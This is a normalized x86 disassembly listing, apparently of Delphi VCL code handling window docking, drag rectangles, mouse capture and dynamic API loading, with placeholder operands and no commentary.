mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453428
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44e250
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45342f
mov eax [ ebp - 0x10 ]
call sub_403368
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_45320c
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44e264
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_45342f
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_453284
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453480
lea eax [ ebp - 0x14 ]
call sub_404164
retn
sub_453488
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451bd8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c00
call sub_453488
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451bd8
call sub_453488
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_451608
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_451b00
mov edx eax
mov eax ebx
call sub_451b28
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_451b28
jmp r-xdata
sub_453510
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_453488
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_453554
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451b00
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_451b28
sub_453584
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_44f7b4
mov edx eax
mov eax [ rw-data ]
call sub_4540e4
mov eax [ ebx + 0x14 ]
call sub_44f7b4
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_453698
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4535e4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_4540e4
mov eax ebx
call sub_453698
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_451b28
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_451b28
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_453510
push ebx
push sub_453688
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_451eb4
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_453660
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44e250
test eax eax
jle r-xdata
push ebx
push sub_453688
xor edx edx
mov eax ebx
call sub_451eb4
sub_453698
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_4516cc
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_4516cc
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_451738
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_451738
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_4249d8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_453784
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_453784
pop ecx
mov eax ebx
call sub_451b00
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_451b00
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_453784
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451b00
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_429b8c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_453814
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451b00
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_451684
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_451b00
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_453784
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_453864
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_448954
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448954
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_4538e0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_451590
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_45163c
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_451be4
test eax eax
je r-xdata
mov eax esi
call sub_451608
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_453688
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_451eb4
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451be4
mov edx [ ebx + 0x20 ]
call sub_451b3c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_4538e0
pop ecx
sub_453960
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_4515ec
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_4515ec
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_451be4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_453960
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_453688
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_451eb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_4517e8
mov eax edi
call sub_451bd8
test eax eax
je r-xdata
mov eax edi
call sub_451be4
mov esi eax
mov eax esi
call sub_451b00
push eax
mov eax esi
call sub_45163c
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_451bd8
call sub_451b00
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_451b00
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_451b28
mov eax esi
call sub_451b00
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451b28
mov eax edi
call sub_451be4
call sub_451b78
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_45163c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451b28
mov eax edi
call sub_451bd8
call sub_451b78
mov bl 0x1
jmp r-xdata
sub_453a98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451e4c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41723c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452640
test eax eax
je r-xdata
push ebp
call sub_4538e0
pop ecx
push ebp
call sub_453960
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_453864
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_453b20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_4516cc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_4516cc
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_453814
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_453814
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_453bb0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453f88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_452640
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4535e4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452640
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448af8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f8f
lea eax [ ebp - 0x48 ]
call sub_404164
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f7b4
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4477ec
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_449ccc
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404164
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_453a98
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44e2e4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_453698
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e48
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_453b20
pop ecx
mov eax [ ebp - 0x4 ]
call sub_453698
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452640
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_448ed4
jmp r-xdata
mov eax edi
call sub_46534c
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452640
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448954
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_448fb4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_4041b8
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453584
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f7b4
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_449674
jmp r-xdata
sub_453f98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_45410c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_454028
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4540e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_45408c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4540bc
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406f3c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_4540e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454058
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_45410c
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_454070
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_45408c
pop ebx
retn
mov eax ebx
call sub_4540bc
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_454170
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4542d6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4543f4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4543d8
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_4543d8
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4544e4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403368
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403368
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403368
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403368
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404164
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404164
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_45456c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
